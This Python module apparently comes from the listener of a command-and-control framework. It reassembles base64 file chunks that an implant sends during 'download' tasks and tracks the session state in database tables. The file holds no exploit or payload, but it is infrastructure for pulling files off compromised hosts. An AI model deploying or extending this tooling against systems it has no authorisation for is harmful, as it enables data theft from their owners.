import base64
import json
import secrets
from pathlib import Path
from infra.database.database import Queue, Terminal
from infra.database.listener_utils import listener_utils
from logic.terminal.utils.download import (
    delete_tmp_and_dict,
    download_queue_read,
    download_queue_update,
    threads_of_download,
)



def parse_chunk_more(content):
    # Reads the more flag that marks another download chunk
    raw = content.get("more")
    if raw is None:
        return False
    if isinstance(raw, bool):
        return raw
    if isinstance(raw, (int, float)):
        return int(raw) != 0
    if isinstance(raw, str):
        return raw.strip().lower() in ("1", "true", "yes")
    return bool(raw)


def is_download_queue(queue_row):
    # Checks whether the queue row is a download task
    inp = (queue_row.input or "").strip()
    if inp == "download" or inp.startswith("download "):
        return True
    cmd = (queue_row.command or "").strip()
    if cmd == "download" or cmd.startswith("download "):
        return True
    try:
        params = json.loads(queue_row.parameters or "{}")
        if isinstance(params, dict) and params.get("mode") == "download":
            return True
    except Exception:
        pass
    return False


def queue_download_id(queue_row):
    # Reads the download id stored in the queue parameters
    try:
        params = json.loads(queue_row.parameters or "{}")
    except Exception:
        return None
    raw = params.get("download_id")
    if raw is None:
        return None
    text = str(raw).strip()
    return text or None


async def validate_download_queue(task_tag, content, queue_row):
    # Checks that the download session is still active on the server
    queue_check = await listener_utils.check_queue_tag_download(task_tag, content)
    if queue_check.get("status") != "success":
        return {
            "status": "failure",
            "message": queue_check.get("message") or queue_check.get("error") or "queue check failed",
        }

    did = queue_download_id(queue_row)
    mem = download_queue_read(did) if did else None
    tag = (task_tag or "").strip()
    if not did or not mem or not mem.get("active") or (mem.get("cmd_tag") or "").strip() != tag:
        host = (mem.get("host_tag") if mem else "") or (queue_row.host or "")
        raw_tid = content.get("task_id") if isinstance(content, dict) else None
        implant_tid = str(raw_tid).strip() if raw_tid is not None else ""
        await delete_tmp_and_dict(
            tag,
            did,
            host_tag=str(host).strip(),
            source_terminal="listener",
            implant_task_id=implant_tid or None,
        )
        return await listener_utils.apply_task_error(
            task_tag,
            "download session not active on server",
        )

    return None


async def main_download(content, task_tag, queue_row, terminal_rows, source_terminal):
    # Main function that appends each download chunk and stores the path
    raw = (content.get("output") or "").strip()
    if "more" not in content:
        msg = raw or "download failed"
        did = queue_download_id(queue_row)
        dq = download_queue_read(did) if did else None
        host = (dq.get("host_tag") if dq else "") or (queue_row.host or "")
        await delete_tmp_and_dict(
            task_tag,
            did,
            host_tag=str(host).strip(),
            source_terminal=source_terminal or "listener",
        )
        return await listener_utils.apply_task_error(task_tag, msg)

    try:
        body = base64.b64decode("".join(raw.split()), validate=False)
    except Exception:
        did = queue_download_id(queue_row)
        dq = download_queue_read(did) if did else None
        host = (dq.get("host_tag") if dq else "") or (queue_row.host or "")
        await delete_tmp_and_dict(
            task_tag,
            did,
            host_tag=str(host).strip(),
            source_terminal=source_terminal or "listener",
        )
        return {"status": "failure", "message": "invalid download chunk"}
    more = parse_chunk_more(content)

    expected_id = queue_download_id(queue_row)
    reported_id = content.get("download_id")
    if reported_id is not None:
        reported_id = str(reported_id).strip() or None
    raw_task_id = content.get("task_id")
    task_id = None if raw_task_id is None else str(raw_task_id).strip()
    dl_key = expected_id
    if dl_key and reported_id and reported_id != dl_key:
        dl_key = None
    elif not dl_key and reported_id:
        dl_key = reported_id
    if dl_key and task_id:
        threads_of_download[dl_key] = task_id
        download_queue_update(dl_key, implant_task_id=task_id)

    queue_rows = await listener_utils.read(Queue, tag=task_tag)
    queue_completed = bool(queue_rows and queue_rows[0].is_completed == 1)

    tmp_path = None
    if terminal_rows:
        prev = (terminal_rows[0].output or "").strip()
        if prev and "|" in prev:
            tmp_path = Path(prev.split("|", 1)[0])
        elif prev and queue_completed and not more:
            return {"status": "failure", "message": "output already received"}
        elif prev:
            tmp_path = Path(prev)

    if tmp_path is None:
        tmp_path = Path(__file__).resolve().parents[5] / "tmp" / secrets.token_hex(16)
        tmp_path.parent.mkdir(parents=True, exist_ok=True)

    with tmp_path.open("ab") as fh:
        fh.write(body)

    size = tmp_path.stat().st_size
    total_hint = content.get("total")
    try:
        total_hint = int(total_hint) if total_hint is not None else None
    except (TypeError, ValueError):
        total_hint = None
    if more:
        stored = f"{tmp_path}|{size}|{total_hint}" if total_hint and total_hint > 0 else f"{tmp_path}|{size}"
    else:
        stored = str(tmp_path)

    if terminal_rows:
        await listener_utils.modify(
            Terminal,
            filters={"id": terminal_rows[0].id},
            changes={"output": stored},
        )
    else:
        await listener_utils.write(
            Terminal(
                terminal_id=source_terminal,
                tag=task_tag,
                host=queue_row.host,
                input=queue_row.input,
                output=stored,
            )
        )

    if more:
        return {"status": "success", "message": "chunk received"}

    queue_result = await listener_utils.set_queue_output_ok(task_tag)
    if queue_result.get("status") != "success":
        return {"status": "failure", "message": "queue error"}
    return {"status": "success", "message": "output received successfully"}
